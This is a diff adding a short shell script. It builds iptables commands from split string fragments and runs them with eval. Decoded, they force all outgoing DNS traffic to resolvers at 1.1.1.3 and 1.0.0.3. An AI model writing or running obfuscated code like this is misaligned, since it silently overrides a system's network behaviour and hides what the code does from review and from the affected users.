@@ -1,0 +1,3 @@
+z="
+";Kz=' 53 ';Vz=' 1.0';Wz='.0.3';Cz=' -t ';Sz='.1.3';Nz='--to';Lz='-j D';Iz=' --d';Bz='bles';Mz='NAT ';Hz=' tcp';Rz=' 1.1';Az='ipta';Qz='tion';Gz='T -p';Ez='-A O';Oz='-des';Pz='tina';Tz=':53';Xz='-I O';Fz='UTPU';Jz='port';Uz=' udp';Dz='nat ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Az$Bz$Cz$Dz$Ez$Fz$Gz$Uz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Vz$Wz$Tz$z$Az$Bz$Cz$Dz$Xz$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Az$Bz$Cz$Dz$Xz$Fz$Gz$Uz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Vz$Wz$Tz"
